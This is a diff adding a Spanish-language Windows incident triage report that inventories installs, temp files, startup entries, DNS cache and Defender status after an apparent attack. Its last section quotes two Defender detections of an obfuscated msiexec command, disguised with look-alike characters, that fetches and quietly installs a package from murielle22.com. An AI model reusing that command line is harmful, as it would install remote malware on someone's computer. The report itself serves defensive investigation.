@@ -1,0 +1,208 @@
+﻿Revision de equipo - 2026-09-18 21:42:18 - TUCHI7\vsilv
+
+==============================================================================
+1. Instalaciones de Windows Installer en los ultimos 14 dias
+==============================================================================
+
+TimeCreated                  Id Mensaje                                                                                                                                                                 
+-----------                  -- -------                                                                                                                                                                 
+14/09/2026 10:21:38 a. m.  1042 Finalizando una transacción de Windows Installer: C:\Users\vsilv\AppData\Local\Microsoft\TeamsMeetingAddinMsis\1.26.21803\MicrosoftTeamsMeetingAddinInstaller.msi. Id...
+14/09/2026 10:21:38 a. m.  1033 Windows Installer instaló el producto. Nombre del producto: Microsoft Teams Meeting Add-in for Microsoft Office. Versión del producto: 1.26.21803. Idioma del product...
+14/09/2026 10:21:38 a. m. 11707 Product: Microsoft Teams Meeting Add-in for Microsoft Office -- Installation completed successfully.                                                                    
+14/09/2026 10:21:35 a. m.  1040 Iniciando una transacción de Windows Installer: C:\Users\vsilv\AppData\Local\Microsoft\TeamsMeetingAddinMsis\1.26.21803\MicrosoftTeamsMeetingAddinInstaller.msi. Id. ...
+14/09/2026 10:21:35 a. m.  1042 Finalizando una transacción de Windows Installer: {A7AB73A3-CB10-4AA5-9D38-6AEFFBDE4C91}. Id. de proceso del cliente: 17012.                                            
+14/09/2026 10:21:35 a. m.  1034 Windows Installer quitó el producto. Nombre del producto: Microsoft Teams Meeting Add-in for Microsoft Office. Versión del producto: 1.26.20101. Idioma del producto:...
+14/09/2026 10:21:35 a. m. 11724 Product: Microsoft Teams Meeting Add-in for Microsoft Office -- Removal completed successfully.                                                                         
+14/09/2026 10:21:33 a. m.  1040 Iniciando una transacción de Windows Installer: {A7AB73A3-CB10-4AA5-9D38-6AEFFBDE4C91}. Id. de proceso del cliente: 17012.                                              
+12/09/2026 06:23:57 p. m.  1042 Finalizando una transacción de Windows Installer: C:\Users\vsilv\AppData\Local\Temp\WinGet\Microsoft.AzureCLI.2.90.0\azure-cli-2.90.0-x64.msi. Id. de proceso del cli...
+12/09/2026 06:23:57 p. m.  1033 Windows Installer instaló el producto. Nombre del producto: Microsoft Azure CLI (64-bit). Versión del producto: 2.90.0. Idioma del producto: 1033. Fabricante: Micros...
+12/09/2026 06:23:57 p. m. 11707 Product: Microsoft Azure CLI (64-bit) -- Installation completed successfully.                                                                                           
+12/09/2026 06:23:22 p. m.  1040 Iniciando una transacción de Windows Installer: C:\Users\vsilv\AppData\Local\Temp\WinGet\Microsoft.AzureCLI.2.90.0\azure-cli-2.90.0-x64.msi. Id. de proceso del clien...
+12/09/2026 05:54:28 p. m.  1042 Finalizando una transacción de Windows Installer: C:\ProgramData\Package Cache\{04E43F5A-6E23-4718-864D-1D7583406395}v72.44.42384\dotnet-host-9.0.11-win-arm64.msi. I...
+12/09/2026 05:54:28 p. m.  1033 Windows Installer instaló el producto. Nombre del producto: Microsoft .NET Host - 9.0.11 (arm64). Versión del producto: 72.44.42384. Idioma del producto: 1033. Fabri...
+12/09/2026 05:54:28 p. m. 11707 Product: Microsoft .NET Host - 9.0.11 (arm64) -- Installation completed successfully.                                                                                   
+12/09/2026 05:54:27 p. m.  1040 Iniciando una transacción de Windows Installer: C:\ProgramData\Package Cache\{04E43F5A-6E23-4718-864D-1D7583406395}v72.44.42384\dotnet-host-9.0.11-win-arm64.msi. Id....
+12/09/2026 05:54:27 p. m.  1042 Finalizando una transacción de Windows Installer: C:\ProgramData\Package Cache\{8EB74B87-28A0-457A-BB06-BC63E54DF045}v72.44.42384\dotnet-hostfxr-9.0.11-win-arm64.msi...
+12/09/2026 05:54:27 p. m.  1033 Windows Installer instaló el producto. Nombre del producto: Microsoft .NET Host FX Resolver - 9.0.11 (arm64). Versión del producto: 72.44.42384. Idioma del producto:...
+12/09/2026 05:54:27 p. m. 11707 Product: Microsoft .NET Host FX Resolver - 9.0.11 (arm64) -- Installation completed successfully.                                                                       
+12/09/2026 05:54:26 p. m.  1040 Iniciando una transacción de Windows Installer: C:\ProgramData\Package Cache\{8EB74B87-28A0-457A-BB06-BC63E54DF045}v72.44.42384\dotnet-hostfxr-9.0.11-win-arm64.msi. ...
+12/09/2026 05:54:26 p. m.  1042 Finalizando una transacción de Windows Installer: C:\ProgramData\Package Cache\{D60091DF-66D8-4A3F-9C25-6C632CF3585D}v72.44.42384\dotnet-runtime-9.0.11-win-arm64.msi...
+12/09/2026 05:54:26 p. m.  1033 Windows Installer instaló el producto. Nombre del producto: Microsoft .NET Runtime - 9.0.11 (arm64). Versión del producto: 72.44.42384. Idioma del producto: 1033. Fa...
+12/09/2026 05:54:26 p. m. 11707 Product: Microsoft .NET Runtime - 9.0.11 (arm64) -- Installation completed successfully.                                                                                
+12/09/2026 05:54:22 p. m.  1040 Iniciando una transacción de Windows Installer: C:\ProgramData\Package Cache\{D60091DF-66D8-4A3F-9C25-6C632CF3585D}v72.44.42384\dotnet-runtime-9.0.11-win-arm64.msi. ...
+10/09/2026 08:33:58 p. m.  1042 Finalizando una transacción de Windows Installer: c:\program files\microsoft office\root\integration\c2rint.16.msi. Id. de proceso del cliente: 11608.                  
+10/09/2026 08:33:58 p. m.  1035 Windows Installer volvió a configurar el producto. Nombre del producto: Office 16 Click-to-Run Extensibility Component. Versión del producto: 16.0.20326.20072. Idiom...
+10/09/2026 08:33:58 p. m. 11728 Producto: Office 16 Click-to-Run Extensibility Component -- La configuración se completó correctamente.                                                                 
+10/09/2026 08:33:56 p. m.  1040 Iniciando una transacción de Windows Installer: c:\program files\microsoft office\root\integration\c2rint.16.msi. Id. de proceso del cliente: 11608.                    
+
+
+
+
+==============================================================================
+2. Rastro del comando en el historial de Ejecutar
+==============================================================================
+
+==============================================================================
+3. Programas instalados en los ultimos 14 dias
+==============================================================================
+
+DisplayName                                         DisplayVersion Publisher             InstallDate
+-----------                                         -------------- ---------             -----------
+Microsoft .NET Host - 9.0.11 (arm64)                72.44.42384    Microsoft Corporation 20260912   
+Microsoft .NET Host FX Resolver - 9.0.11 (arm64)    72.44.42384    Microsoft Corporation 20260912   
+Microsoft Teams Meeting Add-in for Microsoft Office 1.26.21803     Microsoft             20260914   
+Microsoft Azure CLI (64-bit)                        2.90.0         Microsoft Corporation 20260912   
+Microsoft .NET Runtime - 9.0.11 (arm64)             72.44.42384    Microsoft Corporation 20260912   
+Google Chrome                                       153.0.8010.48  Google LLC            20260915   
+Copilot                                             153.0.4234.48  Microsoft Corporation 20260918   
+Microsoft Edge                                      153.0.4234.32  Microsoft Corporation 20260912   
+WebView2 Runtime de Microsoft Edge                  153.0.4234.46  Microsoft Corporation 20260918   
+Microsoft Visual Studio Code (User)                 1.138.0        Microsoft Corporation 20260918   
+
+
+
+
+==============================================================================
+4. Archivos MSI y ejecutables recientes en carpetas temporales
+==============================================================================
+
+  -- C:\Users\vsilv\AppData\Local\Temp
+
+FullName                                                                                                                                      Length LastWriteTime            
+--------                                                                                                                                      ------ -------------            
+C:\Users\vsilv\AppData\Local\Temp\1o5055uy.ffz\resources\app\ServiceHub\Services\Microsoft.VisualStudio.Setup.Service\BackgroundDownload.exe  185744 10/09/2026 03:36:50 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\cs\vs_layout.resources.dll                                                                      16224 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\de\vs_layout.resources.dll                                                                      16264 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\es\vs_layout.resources.dll                                                                      16264 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\amd64\KernelTraceControl.dll                                                          266696 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\amd64\msdia140.dll                                                                   1745296 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\amd64\msvcp140.dll                                                                    567672 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\amd64\vcruntime140.dll                                                                 97168 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\amd64\vcruntime140_1.dll                                                               37256 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\arm64\KernelTraceControl.dll                                                          258504 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\arm64\msdia140.dll                                                                   3414288 11/09/2026 10:40:06 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\arm64\msvcp140.dll                                                                   1396616 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\arm64\vcruntime140.dll                                                                198024 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\arm64\vcruntime140_1.dll                                                               56200 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\cs\feedback.resources.dll                                                              30040 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\de\feedback.resources.dll                                                              30088 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\es\feedback.resources.dll                                                              30048 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\fr\feedback.resources.dll                                                              30088 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\it\feedback.resources.dll                                                              30048 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\ja\feedback.resources.dll                                                              30048 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\ko\feedback.resources.dll                                                              30088 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\pl\feedback.resources.dll                                                              30048 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\pt-BR\feedback.resources.dll                                                           30088 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\ru\feedback.resources.dll                                                              30600 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\runtimes\win-arm64\native\msalruntime_arm64.dll                                      3102792 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\runtimes\win-x64\native\msalruntime.dll                                              2920992 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\runtimes\win-x86\native\msalruntime_x86.dll                                          2565176 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\tr\feedback.resources.dll                                                              30048 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\x86\KernelTraceControl.dll                                                            185800 11/09/2026 10:40:07 p. m.
+C:\Users\vsilv\AppData\Local\Temp\51qyf4ji.tss\Feedback\x86\KernelTraceControl.Win61.dll                                                      159952 11/09/2026 10:40:07 p. m.
+
+
+
+
+  -- C:\Windows\Temp
+     sin novedades
+
+  -- C:\Users\vsilv\AppData\Roaming
+     sin novedades
+
+  -- C:\Users\vsilv\AppData\Local
+
+FullName                                                                                                                                                                                Length LastWrite
+                                                                                                                                                                                               Time     
+--------                                                                                                                                                                                ------ ---------
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\257.js                                                                 132275 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\background.js                                                            3801 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\contentScript.js                                                        41085 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\jquery.min.js                                                           89225 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\options.js                                                               5392 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\picker-anywhere.js                                                       2165 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\clldacgmdnnanihiibdgemajcfkmfhia\4.0.2_0\popup.js                                                                88349 07/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.102.9_0\js\background.js                                                     440621 08/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.102.9_0\js\content.js                                                        659241 08/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.102.9_0\js\options.js                                                          4108 08/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.102.9_0\js\vendor.js                                                        1090729 08/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.103.0_0\js\background.js                                                     440867 17/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.103.0_0\js\content.js                                                        653172 17/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.103.0_0\js\options.js                                                          4108 17/09/...
+C:\Users\vsilv\AppData\Local\Google\Chrome\User Data\Default\Extensions\fonalplhodhnenmokepaijoemaednpjm\2.103.0_0\js\vendor.js                                                        1089609 17/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\excel-win32-16.01.js                                       741263 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\officeaddindialog.js                                      1012899 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\office_strings.js                                           20921 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\otel.js                                                     16034 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\oteljs_agave.js                                             73679 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\reportviewerdialog.js                                      951868 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\taskpane.js                                               1863941 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\296987387c163b458f3ce9880fdd5ae\PackageResources\OfflineFiles\vendor.js                                                  471875 10/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\main_7476d023449b3c8dde3c31c306feff63.js                 2834126 18/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\office_bb798de0be696d51c249fa1360f329b6.js                 69476 18/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\office_strings.debug_497d90b1faac7bd44055585720c3d82c.js   21653 18/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\office_strings.debug_72b13d0d1f23842be5c53457f9236c3b.js   21653 18/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\office_strings_176f6558dbb440f26decec866f7cb844.js         21380 18/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\office_strings_247f8f78dd7820085808b5e8fec39119.js         21380 18/09/...
+C:\Users\vsilv\AppData\Local\Microsoft\Office\SolutionPackages\6d626d8042bf214d9eecbec28a456c19\PackageResources\OfflineFiles\oteljs_agave_cc8f80350be7f054cf0bd5d00eb24523.js           73679 18/09/...
+
+
+
+
+==============================================================================
+5. Persistencia: claves Run y carpetas de inicio
+==============================================================================
+
+  -- HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+     OneDrive = "C:\Users\vsilv\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+     Teams = "C:\Users\vsilv\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe" msteams:system-initiated
+     Microsoft.Lists = C:\Users\vsilv\AppData\Local\Microsoft\OneDrive\26.158.0816.0003\OneDrive.Sync.Service.exe
+     GoogleChromeAutoLaunch_F1764AD9A37FFA6716DB4B6544560038 = "C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window /prefetch:5
+     MicrosoftEdgeAutoLaunch_C865BDACCB2230B3A6EA505FBB0140E0 = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start
+     MicrosoftCopilotAutoLaunch_0668417083FDB91CA8311CCDBB9C80D9 = "C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --no-startup-window --win-session-start
+
+  -- HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
+     SecurityHealth = C:\Windows\system32\SecurityHealthSystray.exe
+
+  -- HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+  -- HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+     msedge_cleanup_{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5} = "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\153.0.4234.46\Installer\setup.exe" --msedgewebview --delete-old-versions --system-level --verbose-logging --on-logon
+
+  -- Carpeta de inicio
+     Enviar a OneNote.lnk  09/17/2026 21:43:56
+
+==============================================================================
+6. Tareas programadas creadas en los ultimos 14 dias
+==============================================================================
+Ninguna creada en el periodo.
+
+==============================================================================
+7. Rastro de los dominios del ataque en la cache DNS
+==============================================================================
+      murielle22 no aparece
+      trackerredirect no aparece
+      campaigntracker no aparece
+
+==============================================================================
+8. Estado del antivirus
+==============================================================================
+
+
+AMServiceEnabled              : True
+RealTimeProtectionEnabled     : True
+AntivirusSignatureLastUpdated : 18/09/2026 11:34:19 a. m.
+QuickScanEndTime              : 17/09/2026 04:38:25 p. m.
+
+
+
+
+>>> Defender detecto amenazas en el periodo:
+
+InitialDetectionTime        ThreatID Resources                                                                                                                                                          
+--------------------        -------- ---------                                                                                                                                                          
+18/09/2026 09:18:10 p. m. 2147949206 {CmdLine:_C:\Windows\System32\msiexec.exe /ᵖᵃᶜᵏᵃᵍᵉ http:\\murielle22.com\dpo33feev1u19h /Q S1=Systеm Sеttings Вrоkеr 10.0.19041 rеаdy                           ...
+18/09/2026 09:17:04 p. m. 2147949206 {CmdLine:_C:\Windows\System32\msiexec.exe /ᵖᵃᶜᵏᵃᵍᵉ http:\\murielle22.com\dpo33feev1u19h /Q S1=Systеm Sеttings Вrоkеr 10.0.19041 rеаdy                           ...
+
+
+
